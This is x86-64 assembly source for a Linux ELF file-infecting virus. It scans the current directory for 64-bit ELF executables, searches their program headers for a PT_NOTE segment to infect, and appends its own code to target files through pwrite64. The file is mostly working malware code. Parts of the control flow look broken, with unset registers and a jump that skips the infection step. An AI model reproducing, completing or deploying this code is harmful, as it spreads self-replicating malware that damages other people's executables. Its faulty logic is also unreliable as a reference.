%define SYS_EXIT        60
%define SYS_OPEN        2
%define SYS_CLOSE       3
%define SYS_WRITE       1
%define SYS_READ        0
%define SYS_EXECVE      59
%define SYS_GETDENTS64  217
%define SYS_FSTAT       5
%define SYS_LSEEK       8
%define SYS_PREAD64		17
%define SYS_PWRITE64	18
%define SYS_SYNC		162
%define SYS_GETUID		102

%define DT_REG			8

%define SEEK_END		2
%define DIRENT_BUFFSIZE	1024

%define PT_LOAD			1
%define PT_NOTE			4

%define O_RDONLY        00000000
%define O_WRONLY        00000001
%define O_RDWR          00000002

%define argv0			[rsp + 8]
%define argc			[rsp + 4]

; r15 + 0 = stack buffer = stat
; r15 + 48 = stat.st_size

; r15 + 144 = ehdr
; r15 + 148 = ehdr.class
; r15 + 152 = ehdr.pad
; r15 + 168 = ehdr.entry
; r15 + 176 = ehdr.phoff
; r15 + 198 = ehdr.phentsize
; r15 + 200 = ehdr.phnum

; r15 + 208 = phdr = phdr.type
; r15 + 212 = phdr.flags
; r15 + 216 = phdr.offset
; r15 + 224 = phdr.vaddr
; r15 + 232 = phdr.paddr
; r15 + 240 = phdr.filesz
; r15 + 248 = phdr.memsz
; r15 + 256 = phdr.align

; r15 + 300 = jmp rel

; r15 + 350 = directory size

; r15 + 400 = dirent = dirent.d_ino
; r15 + 416 = dirent.d_reclen
; r15 + 418 = dirent.d_type
; r15 + 419 = dirent.d_name

section .text
	global _start
_start:
    mov r14, [rsp + 8]                                          ; saving argv0 to r14
    push rdx
    push rsp
    sub rsp, 5000                                               ; reserving 5000 bytes
    mov r15, rsp  
	call dirent
	call exit
	dirent:
		push "."                                                ; pushing "." to stack (rsp)
		mov rdi, rsp                                            ; moving "." to rdi
		mov rsi, O_RDONLY
		xor rdx, rdx                                            ; not using any flags
		mov rax, SYS_OPEN
		syscall

		pop rdi
		cmp rax, 0
		jle	err

		mov rdi, rax
		lea rsi, [r15 + 400]
		mov rdx, DIRENT_BUFFSIZE
		mov rax, SYS_GETDENTS64
		syscall   

		cmp rax, 0
		jle err

		mov qword [r15 + 350], rax
		mov rax, SYS_CLOSE
		syscall
		
		xor rcx, rcx
	for_each_file:
		push rcx
		cmp byte [r15 + 418 + rcx], DT_REG
		jne .continue
		.open_target_file:
            lea rdi, [rcx + r15 + 419]                          ; dirent.d_name = [r15 + 419]
            mov rsi, O_RDWR
            xor rdx, rdx
            mov rax, SYS_OPEN
            syscall

            cmp rax, 0                                          ; if can't open file, exit now
            jle .continue
            mov r9, rax  
		.read_ehdr:
			mov rdi, r9                                         ; r9 contains fd
			lea rsi, [r15 + 144]                                ; rsi = ehdr = [r15 + 144]
			mov rdx, 64                                  ; ehdr.size
			mov r10, 0                                          ; read at offset 0
			mov rax, SYS_PREAD64
			syscall
		.is_elf_64:
			cmp dword [r15 + 144], 0x464c457f                   ; 0x464c457f means .ELF (little-endian)
			jnz .close_file  
			cmp byte [r15 + 148], 2                    ; check if target ELF is 64bit
			jne .close_file

		.loop_phdr:
			mov rdi, r9                                         ; r9 contains fd
			lea rsi, [r15 + 208]                                ; rsi = phdr = [r15 + 208]
			mov dx, word [r15 + 198]                            ; ehdr.phentsize is at [r15 + 198]
			mov r10, r8                                         ; read at ehdr.phoff from r8 (incrementing ehdr.phentsize each loop iteraction)
			mov rax, SYS_PREAD64
			syscall

			cmp byte [r15 + 208], PT_NOTE                       ; check if phdr.type in [r15 + 208] is PT_NOTE (4)
			jz .continue                                          ; if yes, jackpot, start infecting
			mov rax, SYS_GETUID
			syscall
			inc rbx                                             ; if not, increase rbx counter
			cmp bx, word [r15 + 200]                            ; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])
			jge .close_file                                     ; exit if no valid phdr for infection was found

			add r8w, word [r15 + 198]                           ; otherwise, add current ehdr.phentsize from [r15 + 198] into r8w
			jnz .loop_phdr                                      ; read next phdr

		.infect:
			.get_target_phdr_file_offset:
				mov ax, bx                                      ; loading phdr loop counter bx to ax
				mov dx, word [r15 + 198]                        ; loading ehdr.phentsize from [r15 + 198] to dx
				imul dx                                         ; bx * ehdr.phentsize
				mov r14w, ax
				add r14, [r15 + 176]                            ; r14 = ehdr.phoff + (bx * ehdr.phentsize)

			.file_info:
				mov rdi, r9
				mov rsi, r15                                    ; rsi = r15 = stack buffer address
				mov rax, SYS_FSTAT
				syscall 
			.append_virus:
				; getting target EOF
				mov rdi, r9                                     ; r9 contains fd
				mov rsi, 0                                      ; seek offset 0
				mov rdx, SEEK_END
				mov rax, SYS_LSEEK
				syscall                                         ; getting target EOF offset in rax
				push rax                                        ; saving target EOF

				call .delta                                     ; the age old trick
				.delta:
					pop rbp
					sub rbp, .delta

				; writing virus body to EOF
				mov rdi, r9                                     ; r9 contains fd
				lea rsi, [rbp + _start]                        ; loading v_start address in rsi
				mov rdx, exit - _start                       ; virus size
				mov r10, rax                                    ; rax contains target EOF offset from previous syscall
				mov rax, SYS_PWRITE64
				syscall
				mov rax, SYS_GETUID
				syscall

				cmp rax, 0
				jle .close_file
		.close_file:
			mov rax, SYS_CLOSE                                  ; close source fd in rdi
			syscall
			
		.continue:
			pop rcx
			add cx, word [rcx + r15 + 416]
			cmp rcx, qword [r15 + 350]
			jne for_each_file
		jmp cleanup
	; puts:
	; 	call strlen
	; 	mov rdx, rax		;strlen
	; 	mov rsi, rdi		;buff
	; 	mov rdi, 1			;fd
	; 	mov rax, SYS_WRITE	;syscall
	; 	syscall
	; 	push 0xa
	; 	mov rsi, rsp
	; 	mov rdx, 1
	; 	mov rdi, 1
	; 	mov rax, SYS_WRITE
	; 	syscall
	; 	pop rsi
	; 	ret
	; strlen:
	; 	xor rax, rax
	; 	.loop:
	; 		cmp byte [rdi + rax], 0
	; 		je .end
	; 		inc rax
	; 		jmp strlen.loop
	; 	.end:
	; 		ret
cleanup:
    add rsp, 5000                                               ; restoring stack so host process can run normally, this also could use some improvement
    ; pop rsp
    ; pop rdx
	jmp exit
err:
	mov rax, SYS_EXIT
	mov rdi, 0xfffffff
	syscall
exit:
	mov rax, SYS_EXIT
	mov rdi, 0
	syscall
